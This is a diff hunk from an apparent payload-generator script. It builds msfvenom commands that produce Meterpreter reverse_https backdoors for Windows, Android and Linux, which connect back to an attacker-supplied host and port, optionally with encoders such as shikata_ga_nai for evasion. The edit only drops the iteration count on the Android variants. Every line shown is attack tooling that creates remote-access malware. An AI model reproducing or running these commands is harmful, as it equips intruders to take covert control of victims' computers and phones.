@@ -175,11 +175,11 @@ def main():
     elif payload == "1" and encoder == "0":
         comma = f"msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} -i 33 -f exe > {name}.exe --smallest"
     elif payload == "2" and encoder == "1":
-        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/fnstenv_mov -i 33 -f raw > {name}.apk --smallest"
+        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/fnstenv_mov  -f raw > {name}.apk --smallest"
     elif payload == "2" and encoder == "2":
-        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 33 -f raw > {name}.apk --smallest"
+        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/shikata_ga_nai  -f raw > {name}.apk --smallest"
     elif payload == "2" and encoder == "0":
-        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -i 33 -f raw > {name}.apk --smallest"
+        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port}  -f raw > {name}.apk --smallest"
     elif payload == "3" and encoder == "1":
         comma = f"msfvenom -p linux/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/fnstenv_mov -i 33 -f elf > {name}.elf --smallest"
     elif payload == "3" and encoder == "2":
